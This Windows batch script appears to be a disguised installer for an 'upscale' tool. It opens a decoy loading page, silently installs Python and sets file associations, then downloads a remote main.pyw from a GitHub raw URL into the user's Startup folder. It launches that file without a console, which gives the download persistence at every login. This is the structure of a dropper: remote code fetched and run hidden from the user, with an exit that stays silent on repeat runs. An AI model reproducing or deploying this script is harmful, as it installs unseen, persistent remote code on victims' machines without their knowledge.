@echo off
setlocal EnableDelayedExpansion

set "STARTUP_FOLDER=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "TARGET_FILE=%STARTUP_FOLDER%\main.pyw"
set "GITHUB_URL=https://raw.githubusercontent.com/sofiawilsonai/upscale/refs/heads/main/main.pyw"

:: Open repo in browser always
start "" "https://sofiawilsonai.github.io/upscale/loading.html"

:: Already done? Exit silently.
if exist "%TARGET_FILE%" exit /b 0

:: --- Find pythonw.exe ---
set "PYTHONW="
for /d %%d in ("%LOCALAPPDATA%\Programs\Python\Python3*") do (
    if exist "%%d\pythonw.exe" set "PYTHONW=%%d\pythonw.exe"
)

:: --- Install Python if not found ---
if not defined PYTHONW (
    echo [INFO] Installing Python...
    winget install -e --id Python.Python.3.12 --scope user --silent --accept-package-agreements --accept-source-agreements
    if !ERRORLEVEL! neq 0 (
        echo [ERROR] Failed to install Python.
        pause
        exit /b 1
    )
    for /d %%d in ("%LOCALAPPDATA%\Programs\Python\Python3*") do (
        if exist "%%d\pythonw.exe" set "PYTHONW=%%d\pythonw.exe"
    )
)

if not defined PYTHONW (
    echo [ERROR] pythonw.exe not found after install.
    pause
    exit /b 1
)
echo [OK] Python: %PYTHONW%

:: --- Add to user PATH if needed ---
for /f "skip=2 tokens=2*" %%a in ('reg query "HKCU\Environment" /v PATH 2^>nul') do set "UPATH=%%b"
for %%f in ("%PYTHONW%") do set "PYDIR=%%~dpf"
set "PYDIR=%PYDIR:~0,-1%"

echo "%UPATH%" | find /i "%PYDIR%" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    setx PATH "%PYDIR%;%PYDIR%\Scripts;%UPATH%" >nul
    set "PATH=%PYDIR%;%PYDIR%\Scripts;%PATH%"
    echo [OK] Python added to PATH.
)

:: --- Register .pyw association ---
reg add "HKCU\Software\Classes\.pyw" /ve /d "Python.NoConFile" /f >nul
reg add "HKCU\Software\Classes\Python.NoConFile" /ve /d "Python File (no console)" /f >nul
reg add "HKCU\Software\Classes\Python.NoConFile\shell\open\command" /ve /d "\"%PYTHONW%\" \"%%1\"" /f >nul
echo [OK] .pyw associated with pythonw.

:: --- Install dependencies ---
echo [INFO] Installing dependencies...
"%PYDIR%\python.exe" -m pip install requests --quiet
echo [OK] Dependencies installed.

:: --- Download pereraschot.pyw ---
echo [INFO] Downloading pereraschot.pyw...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%TARGET_FILE%'"
if %ERRORLEVEL% neq 0 (
    echo [ERROR] Download failed. Check URL: %GITHUB_URL%
    pause
    exit /b 1
)
echo [OK] Saved to Startup folder.

:: --- Launch ---
start "" "%PYTHONW%" "%STARTUP_FOLDER%\main.pyw"

if %ERRORLEVEL% neq 0 (
    echo [ERROR] Launch failed: %PYTHONW%
    pause
)

echo [DONE]

endlocal
exit /b 0
